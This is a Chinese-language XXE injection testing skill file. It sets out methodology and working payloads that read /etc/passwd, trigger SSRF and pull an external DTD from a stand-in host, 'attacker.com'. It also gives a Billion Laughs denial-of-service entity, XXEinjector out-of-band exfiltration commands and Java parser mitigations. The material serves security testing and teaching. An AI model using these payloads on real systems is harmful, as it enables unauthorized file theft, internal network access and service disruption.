---
id: xxe-testing
name: XXE Testing
description: XXE XML外部实体注入测试的专业技能和方法论
version: 1.0.0
aliases:
  - xxe
  - xml-external-entity
tags:
  - xxe
  - xml
  - parser
target_types:
  - web
  - api
---

# XXE XML外部实体注入测试

## 概述

XXE（XML External Entity）注入是一种利用XML解析器处理外部实体的漏洞。

## 漏洞原理

XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻击或导致拒绝服务。常见于：
- XML文档解析
- SOAP服务
- Office文档（.docx, .xlsx等）
- SVG图片
- PDF文件

## 测试方法

### 1. 识别XML输入点
- 文件上传功能、API接口接受XML数据、SOAP请求、Office文档处理、数据导入功能

### 2. 基础XXE检测
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**测试网络请求（SSRF）：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<foo>&xxe;</foo>
```

### 3. 盲XXE检测
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

## 利用技术

### 文件读取
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

### SSRF攻击
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
```

### 拒绝服务 (Billion Laughs)
```xml
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  ...
]>
<foo>&lol9;</foo>
```

## 工具使用

### XXEinjector
```bash
# 基础使用
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml

# 文件读取
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd
```

## 防护措施

1. **禁用外部实体**
   ```java
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   ```
2. **使用白名单验证**
3. **使用安全的解析器** - 使用不处理DTD的解析器或使用JSON替代XML
